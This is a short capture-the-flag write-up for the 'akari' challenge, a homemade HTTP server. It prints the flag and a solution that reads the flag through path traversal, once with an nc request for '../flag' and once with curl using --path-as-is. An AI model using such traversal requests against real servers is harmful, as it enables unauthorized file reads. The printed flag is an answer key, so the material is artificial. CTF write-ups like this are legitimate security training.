@@ -1,0 +1,33 @@
+#+TITLE: akari
+#+AUTHOR: calx
+
+Assume host and port: nyx.istaroth.xyz 54321
+
+* Challenge
+
+** Source Code
+
+[[https://github.com/null-calx/akari.git][akari]] (not public during CTF)
+
+** Description
+
+I tried making a http server yesterday. What do you guys think?
+
+** Flag
+
+~prism{../../Found_THE_f1ag/../..}~
+
+* Solution
+
+#+begin_example
+  $ nc nyx.istaroth.xyz 54321
+  GET ../flag SOMETHING
+
+
+#+end_example
+
+or as suggested by @ctfguy
+
+#+begin_src sh
+  curl http://nyx.istaroth.xyz:54321/../flag --path-as-is
+#+end_src
